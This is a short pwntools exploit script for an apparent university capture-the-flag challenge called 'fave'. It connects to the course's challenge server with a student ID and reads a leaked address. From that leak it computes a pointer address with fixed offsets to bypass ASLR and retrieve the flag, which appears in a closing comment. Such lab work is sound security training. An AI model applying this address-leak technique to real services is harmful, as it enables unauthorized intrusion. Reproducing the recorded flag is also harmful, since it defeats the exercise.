from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "fave"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1251
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
hint_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {hint_addr}")
print(p.recvuntil(b"> ").decode())
hint_addr = u64(hint_addr)
hint_offset = 0x12a9
beverage_ptr_ptr_offset = 0x43f8
beverage_ptr_ptr_addr = hint_addr - hint_offset + beverage_ptr_ptr_offset
p.sendline(str(beverage_ptr_ptr_addr).encode())
log.info(f"Sending address in base 10: {str(beverage_ptr_ptr_addr)}")
print(p.recvall().decode())

p.interactive()

# flag{l34ks_d0ubl3_p01nt3rs_4nd_0ffs3ts_t0_w1n!_aa93ceff513ba4d9}
